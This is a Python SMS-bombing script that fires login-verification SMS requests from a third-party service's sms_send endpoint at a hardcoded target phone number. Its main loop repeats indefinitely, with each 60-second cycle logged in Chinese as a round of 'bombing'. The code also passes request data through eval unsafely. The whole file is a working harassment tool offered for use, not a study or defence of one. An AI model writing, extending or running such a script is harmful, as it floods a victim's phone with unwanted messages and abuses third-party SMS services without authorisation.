from email import parser
import requests
import json
import time
import random
import urllib.parse
import urllib.request
import argparse
import sys

# post地址 post参数
APIS = [
{
    "desc": "UU跑腿",
    'url': 'http://www.tianhuyun.com/edu_cloud/sms_send',
    "method": "post",
    "header": "",
    'data': {
        "to":"[phone]", 
"sms_type": "sms_user_login"
    }
},
]

def sendSMS(API, phone):
    header = {
        'User-Agent': "Mozilla/5.0 (iPod; U; CPU iPhone OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8J2 Safari/6533.18.5",
    }
    if API.get('header'):
        header.update(API.get('header'))
    body = API.get('method')
    try:
        if body:
            body = API.get("data")
            print("Post:")
            print(phone)
            url = API.get('url').replace("[phone]", phone).replace("[timestamp]", str(int(time.time() * 1000))).replace("[timestamp1]", str(int(time.time() * 1000)))
            body = eval(str(body).replace("[phone]", phone)) if isinstance(body, dict) else body.replace("[phone]", phone)
            if API.get('payload'):
                body = json.dumps(body)
            print("request")
            r = requests.post(url, body, headers=header)
            print('request over')
        else:
            url = API.get('url').replace("{phone}", phone).replace("[timestamp]", str(int(time.time() * 1000))).replace("[timestamp1]", str(int(time.time() * 1000)))
            print("Get:")
            r = requests.get(url, headers=header)
        print('Status_Code:')
        print(r.status_code)
        print('-----------------------------------------')
        print(url)
        print('-----------------------------------------')
        #print(r.text)
        print(json.loads(r.text))
    except:
        ...


def main(phone):
    i = 1
    while i > 0:
        for API in APIS:
            sendSMS(API, phone)
            time.sleep(random.randint(1, 3))
        print(f"{time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())} 第{i}轮轰炸完成！等待60秒后，开始第{i + 1}轮轰炸！")
        time.sleep(60)
        i += 1
        

if __name__ == '__main__':
    # 手机号
    #phone = sys.argv[1]
    phone = '18616202661'
    sendSMS(APIS[0], phone)
    #main(phone)
